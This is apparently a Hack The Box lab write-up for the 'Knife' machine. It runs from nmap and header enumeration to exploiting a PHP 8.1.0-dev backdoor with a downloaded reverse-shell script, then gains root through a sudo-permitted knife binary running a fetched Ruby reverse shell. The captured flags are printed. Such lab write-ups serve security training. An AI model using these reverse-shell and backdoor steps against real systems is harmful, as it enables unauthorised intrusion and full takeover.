@@ -1,0 +1,51 @@
+10.10.10.242
+ttl 63
+
+[+]GATHERING INFORMATION[+]
+
+[-]nmap[-]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title:  Emergent Medical Idea
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+[+]ENUMERATION[+]
+http://knife.htb/index.php
+
+curl -I knife.htb/index.php
+HTTP/1.1 200 OK
+Date: Wed, 18 May 2022 11:09:31 GMT
+Server: Apache/2.4.41 (Ubuntu)
+X-Powered-By: PHP/8.1.0-dev
+Content-Type: text/html; charset=UTF-8
+
+
+[+]EXPLOIT[+]
+PHP 8.1.0-dev Backdoor Remote Code Execution
+wget https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
+sudo python3 revshell_php_8.1.0-dev.py http://10.10.10.242/ 10.10.14.21 4444
+
+[+]PRIVILAGE ESCALATION[+]
+james@knife:~$ cat user.txt
+2678402e153577036cba11ebfc36108d
+
+james@knife:~$ sudo -l
+ROOT (NOPASSWD) /usr/bin/knife
+
+james@knife:~$ find / -writable
+/dev/shm
+
+james@knife:~$ cd /dev/shm 
+wget https://raw.githubusercontent.com/secjohn/ruby-shells/master/revshell.rb
+
+sudo /usr/bin/knife  exec revershell.rb
+whoami
+root
+cat /root/root.txt
+8a8b314fbb7b1deda33164f8d04e70c7
